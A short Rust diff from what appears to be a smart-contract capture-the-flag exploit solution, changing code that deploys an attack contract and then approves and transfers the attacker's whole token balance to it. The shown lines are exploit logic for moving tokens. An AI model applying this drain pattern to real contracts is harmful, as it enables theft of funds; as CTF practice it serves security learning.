@@ -19,13 +19,18 @@ impl ctf::Exploit for Exploit {
             Offshore::deploy(offender.to_owned(), target.address)?
                 .send()
                 .await?;
-
-        contract.approve(offender.address(), 1_000_000);
-        contract.transferFrom(
-            offender.address(),
-            hack_contract.address(),
-            1_000_000,
-        );
+        let all_money = contract.balance_of(offender.address()).await?;
+        contract.approve(offender.address(), all_money).send().await?;
+        contract
+            .transfer_from(
+                offender.address(),
+                hack_contract.address(),
+                all_money,
+            )
+            .send()
+            .await?;
+        //println!("Balance: {:?}",
+        // hack_contract.balance().await?);
 
         Ok(())
     }
